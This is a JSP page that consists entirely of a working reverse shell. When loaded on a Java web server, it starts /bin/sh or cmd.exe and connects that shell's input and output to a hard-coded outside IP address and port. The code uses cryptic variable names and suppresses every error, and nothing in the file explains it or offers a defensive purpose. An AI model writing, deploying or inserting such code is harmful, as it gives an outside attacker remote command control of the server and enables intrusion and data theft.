<%@page import="java.lang.*"%>
<%@page import="java.util.*"%>
<%@page import="java.io.*"%>
<%@page import="java.net.*"%>

<%
  class StreamConnector extends Thread
  {
    InputStream qb;
    OutputStream zG;

    StreamConnector( InputStream qb, OutputStream zG )
    {
      this.qb = qb;
      this.zG = zG;
    }

    public void run()
    {
      BufferedReader mK  = null;
      BufferedWriter cPR = null;
      try
      {
        mK  = new BufferedReader( new InputStreamReader( this.qb ) );
        cPR = new BufferedWriter( new OutputStreamWriter( this.zG ) );
        char buffer[] = new char[8192];
        int length;
        while( ( length = mK.read( buffer, 0, buffer.length ) ) > 0 )
        {
          cPR.write( buffer, 0, length );
          cPR.flush();
        }
      } catch( Exception e ){}
      try
      {
        if( mK != null )
          mK.close();
        if( cPR != null )
          cPR.close();
      } catch( Exception e ){}
    }
  }

  try
  {
    String ShellPath;
if (System.getProperty("os.name").toLowerCase().indexOf("windows") == -1) {
  ShellPath = new String("/bin/sh");
} else {
  ShellPath = new String("cmd.exe");
}

    Socket socket = new Socket( "18.231.93.153", 18201 );
    Process process = Runtime.getRuntime().exec( ShellPath );
    ( new StreamConnector( process.getInputStream(), socket.getOutputStream() ) ).start();
    ( new StreamConnector( socket.getInputStream(), process.getOutputStream() ) ).start();
  } catch( Exception e ) {}
%>
